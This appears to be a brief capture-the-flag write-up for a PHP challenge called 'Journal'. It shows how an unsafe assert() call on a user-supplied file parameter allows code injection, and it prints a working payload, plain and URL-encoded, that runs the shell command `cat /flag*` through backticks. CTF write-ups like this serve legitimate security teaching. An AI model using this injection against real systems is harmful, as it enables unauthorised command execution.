# Journal

## Problem

dear diary, there is no LFI in this app

## Solution

from the following line in index.php

```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```

we can override the checking using the following input: `',die(`cat /flag*`));//`

the above input will make the checking do the following: `strpos('',die(`cat /flag*`));//', '..') === false") or die("Invalid file!`

The following encoded input will output the flag: `%27,die(`cat%20/flag*`));//`